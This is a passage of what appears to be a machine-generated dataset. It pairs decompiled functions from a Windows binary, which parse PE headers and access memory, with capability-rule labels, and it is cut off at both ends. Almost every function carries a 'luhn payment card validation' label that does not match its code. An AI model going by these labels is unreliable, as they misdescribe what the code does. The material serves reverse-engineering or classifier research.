        "decompiled_code": "\nulong fcn.00044404(uint32_t *arg1, uint64_t arg2)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    bool bVar3;\n    \n    uVar2 = *0x80544;\n    if ((*0x80544 != 0) && (uVar2 + 0x11 < (arg2 & 0xffffffff))) {\n        bVar3 = *arg1 < *0x15998;\n        if ((*arg1 == *0x15998) && (bVar3 = *(arg1 + 1) < *0x1599c,  *(arg1 + 1) == *0x1599c)) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = (1 - bVar3) - (bVar3 != 0);\n        }\n        if ((iVar1 == 0) && (iVar1 = fcn.0006674c(arg1 + 1, 0x804f0, uVar2, 1, 1),  iVar1 == 0)) {\n            return 1;\n        }\n        bVar3 = *arg1 < *0x15990;\n        if ((*arg1 == *0x15990) && (bVar3 = *(arg1 + 1) < *0x15994,  *(arg1 + 1) == *0x15994)) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = (1 - bVar3) - (bVar3 != 0);\n        }\n        if ((iVar1 == 0) && (iVar1 = fcn.0006674c(arg1 + 5, 0x804f0, uVar2, 1, 1),  iVar1 == 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 408
    },
    "000448bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000448bc(void)\n\n{\n    *0x6b500 = fcn.0002748c(8, 0xdeadbeaf);\n    *0x7d504 = fcn.0002748c(9, 1);\n    return;\n}\n",
        "token_count": 61
    },
    "000448f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000448f0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint64_t arg2_00;\n    \n    arg2_00 = arg2;\n    if (arg3 == 0) {\n        iVar1 = fcn.00044e68(arg1, arg2_00);\n        if (iVar1 != 0) {\n            return 9;\n        }\n    }\n    else {\n        uVar2 = fcn.00044764();\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        uVar2 = fcn.000447a8(arg1, arg2);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        iVar1 = fcn.00043c14(arg1, arg2_00);\n        if (iVar1 != 0) {\n            return 5;\n        }\n        iVar1 = fcn.00044404(arg1, arg2_00);\n        if (iVar1 != 0) {\n            return 0xb;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 254
    },
    "00044a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00044a20(ulong arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack72;\n    \n    uVar2 = 0;\n    uVar3 = arg4;\n    if (arg4 != 0) {\n        do {\n            uVar1 = fcn.00046cf4(arg1, arg2, uVar2 + arg3, uVar3 - uVar2);\n            if (uVar1 != 0) {\n                return uVar1;\n            }\n        } while ((iStack72 != 0) && (uVar2 = uVar2 + iStack72,  uVar2 < uVar3));\n    }\n    return -(uVar2 != uVar3);\n}\n",
        "token_count": 193
    },
    "00044f94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00044f94(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint64_t auStackX24 [2];\n    \n    while( true ) {\n        iVar1 = fcn.000437f4(arg1, arg2, arg3 - 1U, auStackX24);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = fcn.000668de(arg2, 10);\n        if (iVar2 != 0) break;\n        if (auStackX24[0] == arg3 - 1U) goto code_r0x0004500c;\n        iVar1 = fcn.000439b0(arg1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    auStackX24[0] = (iVar2 - arg2) + 1;\ncode_r0x0004500c:\n    iVar1 = fcn.000437f4(arg1, arg2, auStackX24[0], auStackX24);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(auStackX24[0] + arg2) = 0;\n    return 1;\n}\n",
        "token_count": 291
    },
    "00046974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00046974(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t arg1;\n    int32_t aiStackX8 [8];\n    ulong uVar3;\n    uchar auStack1304 [256];\n    int16_t aiStack1048 [256];\n    uchar auStack536 [510];\n    ushort uStack26;\n    \n    fcn.000340ec(0x15b88, 0);\n    fcn.000340ec(0x14220, 0);\n    arg1 = 0;\n    do {\n        iVar1 = fcn.000331cc(arg1, aiStackX8);\n        if ((iVar1 == 0) && (aiStackX8[0] == 0)) {\n            iVar1 = fcn.0003322c(arg1, aiStackX8);\n            if ((iVar1 == 0) && (aiStackX8[0] == 0)) {\n                fcn.00033674(arg1, 9);\n                iVar1 = fcn.00046144(arg1);\n                if (iVar1 == 0) {\n                    uVar3 = 0x100;\n                    iVar1 = fcn.00045ca8(arg1, 0, 0x1010d, auStack1304);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.00032d94(arg1, aiStack1048, 0x100);\n                        if ((iVar1 == 0) && (aiStack1048[0] == 0x7b)) {\n                            iVar1 = fcn.00032e10(arg1, aiStack1048, 0x100);\n                            if (iVar1 != 0) goto code_r0x00046a84;\n                            fcn.00066722(auStack536, 0x100, 0x15b70, auStack1304, aiStack1048);\n                        }\n                        else {\ncode_r0x00046a84:\n                            fcn.00066722(auStack536, 0x100, 0x119cc, auStack1304, uVar3);\n                        }\n                        uStack26 = 0;\n                        fcn.0003314c(arg1, auStack536);\n                    }\n                }\n            }\n        }\n        uVar2 = arg1 + 1;\n        arg1 = uVar2;\n        if (99 < uVar2) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 545
    },
    "00046ad4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00046ad4(void)\n\n{\n    int32_t aiStackX8 [8];\n    uchar uStack216;\n    uchar uStack215;\n    ulong uStack208;\n    ulong uStack200;\n    ulong uStack192;\n    ulong uStack184;\n    code *pcStack176;\n    ulong uStack168;\n    ulong uStack160;\n    code *pcStack152;\n    code *pcStack144;\n    code *pcStack136;\n    uchar auStack128 [24];\n    ulong uStack104;\n    ulong uStack96;\n    code *pcStack88;\n    \n    fcn.000308e8(0x14780, 0x80558, 0x80560);\n    fcn.0006677c(&uStack216, 0, 0xd0);\n    uStack208 = 0x45c5c;\n    uStack200 = 0x45c64;\n    uStack216 = 5;\n    uStack192 = 0x45c20;\n    uStack215 = 0;\n    uStack184 = 0x45e2c;\n    pcStack176 = fcn.0001612c;\n    uStack168 = 0x45d74;\n    uStack160 = 0x468ac;\n    pcStack152 = fcn.0001612c;\n    pcStack144 = fcn.0001612c;\n    pcStack136 = fcn.0001612c;\n    fcn.00066704(auStack128, 0x15ba0);\n    uStack96 = 0x465b0;\n    pcStack88 = fcn.000578a0;\n    uStack104 = 0x45f10;\n    (**0x11050)(aiStackX8, 0x80568, &uStack216, 0xd0);\n    if (aiStackX8[0] == 0) {\n        (**0x11008)(aiStackX8, 0x80578, 100, 0x18);\n        if ((((aiStackX8[0] == 0) && ((**0x11010)(aiStackX8, 0x80570, 100),  aiStackX8[0] == 0)) &&\n            (aiStackX8[0] = fcn.000661ec(),  aiStackX8[0] == 0)) && (aiStackX8[0] = fcn.00046974(),  aiStackX8[0] == 0))\n        {\n            *0x80564 = 1;\n        }\n        else {\n            if (*0x80578 != 0) {\n                (*_fcn.00011090)();\n            }\n            if (*0x80570 != 0) {\n                (*_fcn.00011040)();\n            }\n            (*_fcn.00011048)(aiStackX8, *0x80568);\n        }\n    }\n    return aiStackX8[0];\n}\n",
        "token_count": 646
    },
    "00046ecc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00046ecc(void)\n\n{\n    ulong uVar1;\n    \n    *0x80590 = fcn.00030cc4(0x8000);\n    if (*0x80590 == 0) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        fcn.0006677c(*0x80590, 0, 0x8000);\n        *0x8e3c0 = 0;\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 120
    },
    "0004913c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004913c(ulong arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t arg2_00;\n    ulong uVar2;\n    int64_t iVar3;\n    ulong *in_stack_00000028;\n    \n    if (arg4 == 0) {\n        *in_stack_00000028 = 0;\n        uVar2 = 0;\n    }\n    else {\n        arg2_00 = (**0x114d8)(3, arg1, 0, 0, 0, 0, 1, 0, 0);\n        if (arg2_00 == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            iVar3 = (**0x11140)(arg3, arg4 & 0xffffffff, 0, 0, arg2_00);\n            if (iVar3 == 0) {\n                (**0x11590)(arg2_00, 0);\n                uVar2 = 0xc000009a;\n            }\n            else {\n                (**0x11138)(iVar3, 0, 2);\n                iVar1 = *(arg2_00 + 0xb8);\n                *(iVar1 + -0x10) = 0;\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -0x45) = 0;\n                iVar1 = *(arg2_00 + 0xb8);\n                *(iVar1 + -0x48) = 0xf;\n                *(iVar1 + -0x47) = 8;\n                *(iVar1 + -0x20) = arg1;\n                *(iVar1 + -0x18) = arg2;\n                *(iVar1 + -0x3c) = 0;\n                *(iVar1 + -0x40) = arg4;\n                *(arg2_00 + 8) = iVar3;\n                uVar2 = fcn.00048d94(arg1, arg2_00, 0xf, in_stack_00000028);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 475
    },
    "0004929c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004929c(ulong arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t arg2_00;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    if (arg4 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        arg2_00 = (**0x114d8)(3, arg1, 0, 0, 0, 0, 1, 0, 0);\n        if (arg2_00 == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            iVar3 = (**0x11140)(arg3, arg4 & 0xffffffff, 0, 0, arg2_00);\n            if (iVar3 == 0) {\n                (**0x11590)(arg2_00, 0);\n                uVar2 = 0xc000009a;\n            }\n            else {\n                (**0x11138)(iVar3, 0);\n                iVar1 = *(arg2_00 + 0xb8);\n                *(iVar1 + -0x10) = 0;\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -0x45) = 0;\n                iVar1 = *(arg2_00 + 0xb8);\n                *(iVar1 + -0x48) = 0xf;\n                *(iVar1 + -0x47) = 7;\n                *(iVar1 + -0x20) = arg1;\n                *(iVar1 + -0x18) = arg2;\n                *(iVar1 + -0x3c) = 0;\n                *(iVar1 + -0x40) = arg4;\n                *(arg2_00 + 8) = iVar3;\n                uVar2 = fcn.00048d94(arg1, arg2_00, 0xf, 0);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 446
    },
    "000493e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000493e4(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t arg2_00;\n    ulong uVar2;\n    \n    arg2_00 = (**0x114d8)(3, arg1, 0, 0, 0, 0, 1, 0, 0);\n    if (arg2_00 == 0) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        iVar1 = *(arg2_00 + 0xb8);\n        *(iVar1 + -0x10) = 0;\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -0x45) = 0;\n        iVar1 = *(arg2_00 + 0xb8);\n        *(iVar1 + -0x48) = 0xf;\n        *(iVar1 + -0x47) = 6;\n        *(iVar1 + -0x20) = arg1;\n        *(iVar1 + -0x18) = arg2;\n        *(iVar1 + -0x40) = 4;\n        *(iVar1 + -0x38) = 0;\n        *(iVar1 + -0x30) = 0;\n        *(iVar1 + -0x28) = 0;\n        uVar2 = fcn.00048d94(arg1, arg2_00, 0xf, 0);\n    }\n    return uVar2;\n}\n",
        "token_count": 329
    },
    "0004a148": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0004a148(int64_t arg1)\n\n{\n    ulong *puVar1;\n    ulong arg1_00;\n    ulong *puVar2;\n    \n    puVar1 = *(arg1 + 8);\n    if (puVar1 == NULL) {\n        arg1_00 = 0;\n    }\n    else {\n        if ((*(puVar1 + 10) & 5) == 0) {\n            arg1_00 = (**0x114d0)(puVar1, 0);\n        }\n        else {\n            arg1_00 = puVar1[3];\n        }\n        for (puVar2 = *puVar1; puVar2 != NULL; puVar2 = *puVar2) {\n        }\n    }\n    fcn.00030d24(arg1_00);\n    (*_fcn.00011128)(puVar1);\n    // WARNING: Could not recover jumptable at 0x0004a19d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x110a8)(arg1);\n    return;\n}\n",
        "token_count": 241
    },
    "0004a368": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0004a368(ulong arg1, ulong *arg2, ulong arg3)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    uint64_t arg1_00;\n    ulong *puVar6;\n    ulong *puVar7;\n    bool bVar8;\n    \n    arg1_00 = arg2 & 0xffffffff;\n    uVar5 = (**0x113f0)();\n    puVar6 = *0x8c5d8;\n    do {\n        puVar7 = puVar6;\n        if (puVar6 == NULL) {\ncode_r0x0004a402:\n            (**0x113e8)(0x8d260, arg2 & 0xffffffffffffff00 | uVar5 & 0xff);\n            return puVar7 != NULL;\n        }\n        if ((*(puVar6 + 3) == arg1_00) && (*(puVar6 + 0x1c) == arg1)) {\n            uVar2 = *(puVar6 + 4);\n            arg2 = uVar2;\n            bVar8 = uVar2 < *0x8d280;\n            iVar4 = 0;\n            if (uVar2 == *0x8d280) {\n                uVar1 = *(puVar6 + 0x24);\n                arg2 = uVar2 & 0xffff0000 | uVar1;\n                bVar8 = uVar1 < *0x8d284;\n                if (uVar1 != *0x8d284) goto code_r0x0004a3e3;\n            }\n            else {\ncode_r0x0004a3e3:\n                iVar4 = (1 - bVar8) - (bVar8 != 0);\n            }\n            puVar7 = NULL;\n            if (iVar4 != 0) {\n                arg2 = puVar6;\n                fcn.0006670a(arg3, puVar6, 0x40);\n                puVar7 = puVar6;\n            }\n            goto code_r0x0004a402;\n        }\n        uVar2 = fcn.00030dc8(*(puVar6 + 3));\n        uVar3 = fcn.00030dc8(arg1_00);\n        if (uVar3 < uVar2) {\n            puVar6 = *puVar6;\n        }\n        else {\n            puVar6 = puVar6[1];\n        }\n    } while( true );\n}\n",
        "token_count": 563
    },
    "0004b320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0004b320(int64_t *arg1)\n\n{\n    fcn.0002fc94(*arg1 + 0x68);\n    (*_fcn.00011128)(arg1[1]);\n    // WARNING: Could not recover jumptable at 0x0004b347. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x110a8)(*arg1);\n    return;\n}\n",
        "token_count": 97
    },
    "0004bc44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.0004bc44(void)\n\n{\n    uchar uVar1;\n    \n    uVar1 = fcn.0004c00c(1);\n    return uVar1;\n}\n",
        "token_count": 42
    },
    "0004cd70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004cd70(int64_t arg1, uchar *arg2)\n\n{\n    ulong uVar1;\n    char acStackX16 [24];\n    \n    if (arg2 == NULL) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        if (arg1 == 0) {\n            *arg2 = arg1;\n        }\n        else {\n            uVar1 = fcn.0004cd24(arg1, acStackX16);\n            if (uVar1 != 0) {\n                return uVar1;\n            }\n            if (acStackX16[0] == uVar1) {\n                *arg2 = 0;\n            }\n            else {\n                *arg2 = 1;\n            }\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 183
    },
    "0004cdbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004cdbc(int64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        fcn.0006670a(arg3, arg2, arg4 & 0xffffffff);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00030c58(arg1, arg2, arg3, arg4);\n    }\n    return uVar1;\n}\n",
        "token_count": 114
    },
    "0004cdec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004cdec(int64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        fcn.0006670a(arg2, arg3, arg4 & 0xffffffff);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00030c78(arg1, arg2, arg3, arg4);\n    }\n    return uVar1;\n}\n",
        "token_count": 114
    },
    "0004cef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004cef0(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    ulong uStackX8;\n    ulong auStackX16 [3];\n    \n    auStackX16[0] = arg2;\n    if (arg1 == 0) {\n        fcn.00030d24(arg2);\n        uVar1 = 0;\n    }\n    else {\n        uStackX8 = 0;\n        uVar1 = fcn.00066908(arg1, auStackX16, &uStackX8, 0x8000);\n    }\n    return uVar1;\n}\n",
        "token_count": 138
    },
    "0004d360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0004d360(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    \n    arg1 = *(arg1 + 0x3c) + arg1;\n    uVar5 = *(arg1 + 0x54);\n    uVar1 = *(arg1 + 0x38);\n    if (uVar5 % uVar1 != 0) {\n        uVar5 = (uVar5 / uVar1 + 1) * uVar1;\n    }\n    uVar3 = *(arg1 + 6);\n    if (*(arg1 + 6) != 0) {\n        puVar4 = *(arg1 + 0x14) + 0x20 + arg1;\n        do {\n            uVar2 = *puVar4;\n            if (uVar2 % uVar1 != 0) {\n                uVar2 = (uVar2 / uVar1 + 1) * uVar1;\n            }\n            uVar5 = uVar5 + uVar2;\n            puVar4 = puVar4 + 10;\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    if (uVar5 < *(arg1 + 0x50)) {\n        uVar5 = *(arg1 + 0x50);\n    }\n    return uVar5;\n}\n",
        "token_count": 336
    },
    "0004d458": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0004d458(int64_t arg1, ulong arg2, uint32_t *arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int64_t *in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    \n    iVar4 = *(arg1 + 0x3c) + arg1;\n    uVar6 = *(iVar4 + 0x54);\n    uVar1 = *(iVar4 + 0x38);\n    if (uVar6 % uVar1 != 0) {\n        uVar6 = (uVar6 / uVar1 + 1) * uVar1;\n    }\n    uVar7 = 0;\n    iVar5 = *(iVar4 + 0x14) + 0x18 + iVar4;\n    if (*(iVar4 + 6) != 0) {\n        do {\n            iVar2 = fcn.000668f6(iVar5, arg2, 8);\n            if (iVar2 == 0) {\n                if (arg3 != NULL) {\n                    *arg3 = uVar7;\n                }\n                if (arg4 != NULL) {\n                    *arg4 = iVar5;\n                }\n                if (in_stack_00000028 != NULL) {\n                    *in_stack_00000028 = uVar6 + arg1;\n                }\n                if (in_stack_00000030 != NULL) {\n                    uVar6 = *(iVar5 + 8);\n                    if (uVar6 % uVar1 != 0) {\n                        uVar6 = (uVar6 / uVar1 + 1) * uVar1;\n                    }\n                    *in_stack_00000030 = uVar6;\n                }\n                return 0;\n            }\n            uVar3 = *(iVar5 + 8);\n            if (uVar3 % uVar1 != 0) {\n                uVar3 = (uVar3 / uVar1 + 1) * uVar1;\n            }\n            uVar7 = uVar7 + 1;\n            uVar6 = uVar6 + uVar3;\n            iVar5 = iVar5 + 0x28;\n        } while (uVar7 < *(iVar4 + 6));\n    }\n    return 0x21590005;\n}\n",
        "token_count": 546
    },
    "0004d54c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004d54c(int16_t *arg1, ulong arg2)\n\n{\n    if ((((arg2 == 0) || (0x3f < arg2)) && (*arg1 == 0x5a4d)) &&\n       (((arg2 == 0 || (*(arg1 + 0x1e) + 0x108 <= arg2)) && (*(*(arg1 + 0x1e) + arg1) == 0x4550)))) {\n        return 0;\n    }\n    return 0x21590065;\n}\n",
        "token_count": 123
    },
    "0004d868": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0004d868(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint uVar1;\n    int64_t arg2_00;\n    int64_t iVar2;\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else {\n        arg2_00 = fcn.00030c98(0x20a);\n        if (arg2_00 == 0) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.0006690e(arg2_00, arg2, 0x104);\n            if (iVar2 == -1) {\n                uVar1 = 0x21590066;\n            }\n            else {\n                *(arg2_00 + iVar2 * 2) = 0;\n                uVar1 = fcn.00050fdc(arg1, arg2_00, arg3);\n            }\n            fcn.00030d24(arg2_00);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 266
    },
    "0004dcf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0004dcf8(ulong arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    char acStackX16 [8];\n    int64_t aiStackX24 [2];\n    uchar auStack344 [52];\n    uint32_t uStack292;\n    uchar auStack232 [104];\n    uint32_t uStack128;\n    \n    aiStackX24[0] = 0;\n    if (arg2 == NULL) {\n        return 0x21590066;\n    }\n    iVar1 = fcn.0004cf30(aiStackX24, 0x438, arg1);\n    if ((iVar1 == 0) && (iVar1 = fcn.0004cd70(aiStackX24[0], acStackX16),  iVar1 == 0)) {\n        if (acStackX16[0] == '\\0') {\n            iVar1 = fcn.0004cdbc(aiStackX24[0], *arg2, auStack232, 200);\n            if (iVar1 != 0) goto code_r0x0004de4f;\n            uStack128 = uStack128 & 0xffffefff | 0xc4000;\n            iVar1 = fcn.0004cdec(aiStackX24[0], *arg2, auStack232, 200);\n        }\n        else {\n            iVar1 = fcn.0004cdbc(aiStackX24[0], *arg2, auStack344, 0x68);\n            if (iVar1 != 0) goto code_r0x0004de4f;\n            uStack292 = uStack292 & 0xffffefff | 0xc4000;\n            iVar1 = fcn.0004cdec(aiStackX24[0], *arg2, auStack344, 0x68);\n        }\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n    }\ncode_r0x0004de4f:\n    if (aiStackX24[0] != 0) {\n        fcn.000666f2();\n    }\n    return iVar1;\n}\n",
        "token_count": 467
    },
    "0004de70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0004de70(int64_t arg1, ulong noname_1, uint64_t *arg3)\n\n{\n    uint32_t *arg2;\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint32_t auStackX16 [4];\n    int64_t iStackX32;\n    uchar auStack72 [8];\n    uint64_t uStack64;\n    \n    if (noname_1 != '\\0') {\n        uVar2 = fcn.000667a0(arg1, 0, auStack72, 0x30, 0);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        *arg3 = uStack64;\n        return ~-(uStack64 != 0) & 0x21590005;\n    }\n    iStackX32 = 0;\n    auStackX16[0] = 0;\n    if (arg1 == -1) {\n        iStackX32 = -2;\n    }\n    else {\n        uVar1 = fcn.0004cc00(arg1, 0x48, &iStackX32);\n        uVar2 = uVar1;\n        if (uVar1 != 0) goto code_r0x0004df9a;\n    }\n    uVar1 = fcn.0001f350(iStackX32, 0, auStack72, 0x30);\n    uVar2 = uVar1;\n    if (uVar1 == 0) {\n        if ((uStack64 == 0) || (arg2 = uStack64 + 0x2030,  arg2 == NULL)) {\n            uVar2 = 0x21590005;\n        }\n        else {\n            if (arg1 == 0) {\n                auStackX16[0] = *arg2;\n            }\n            else {\n                uVar1 = fcn.00030c58(arg1, arg2, auStackX16, 4);\n                uVar2 = uVar1;\n                if (uVar1 != 0) goto code_r0x0004df9a;\n            }\n            *arg3 = auStackX16[0];\n            uVar2 = ~-(auStackX16[0] != 0) & 0x21590005;\n        }\n    }\ncode_r0x0004df9a:\n    if (iStackX32 != 0) {\n        fcn.000666f2();\n    }\n    return uVar2;\n}\n",
        "token_count": 552
    },
    "0004e2d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0004e2d8(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    char *arg2_00;\n    char acStackX24 [16];\n    \n    arg2_00 = acStackX24;\n    iVar1 = fcn.0004cd24(arg1, arg2_00);\n    if (iVar1 == 0) {\n        fcn.0004de70(arg1, arg2_00 & 0xffffffffffffff00 | acStackX24[0] == '\\0', arg2);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "0004e30c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0004e30c(ulong noname_0, int64_t *arg2)\n\n{\n    uint64_t uVar1;\n    uchar auStack56 [8];\n    int64_t iStack48;\n    \n    uVar1 = fcn.000667a0(noname_0, 0, auStack56, 0x30, 0);\n    if (uVar1 == 0) {\n        *arg2 = iStack48;\n        uVar1 = ~-(iStack48 != 0) & 0x21590005;\n    }\n    return uVar1;\n}\n",
        "token_count": 135
    },
    "0004eae8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004eae8(ulong arg1, uint64_t arg2, int32_t *arg3)\n\n{\n    int32_t iVar1;\n    uint64_t arg2_00;\n    uint64_t arg2_01;\n    uint32_t uStackX16;\n    uint uStackX20;\n    int64_t iStackX32;\n    int64_t iStack416;\n    uint32_t uStack404;\n    uchar auStack400 [20];\n    uint32_t uStack380;\n    int64_t iStack376;\n    uchar auStack360 [24];\n    uint32_t uStack336;\n    int64_t iStack328;\n    int16_t iStack304;\n    uchar auStack248 [48];\n    uint64_t uStack200;\n    int16_t iStack140;\n    \n    iStackX32 = 0;\n    if (arg2 == 0) {\n        return 0x21590066;\n    }\n    if (arg3 == NULL) {\n        return 0x21590067;\n    }\n    iVar1 = fcn.0004cf30(&iStackX32, 0x410, arg1);\n    if ((iVar1 == 0) && (iVar1 = fcn.0004cd70(iStackX32, &uStackX16),  iVar1 == 0)) {\n        iVar1 = fcn.0004e2d8(iStackX32, &uStackX16);\n        if (iVar1 == 0) {\n            if (uStackX16 == '\\0') {\n                iVar1 = fcn.0004cdbc(iStackX32, CONCAT44(uStackX20, uStackX16), auStack400, 0x20);\n                if (iVar1 == 0) {\n                    if (iStack376 == 0) {\n                        iVar1 = -1;\n                    }\n                    else {\n                        iVar1 = fcn.0004cdbc(iStackX32, iStack376, auStack360, 0x40);\n                        if (iVar1 == 0) {\n                            do {\n                                if (iStack328 == iStack376 + 0x20) goto code_r0x0004ed85;\n                                iVar1 = fcn.0004cdbc(iStackX32, iStack328, &iStack416, 0x10);\n                                if ((iVar1 != 0) ||\n                                   (iVar1 = fcn.0004cdbc(iStackX32, iStack328 + -0x10, auStack248, 0x88),  iVar1 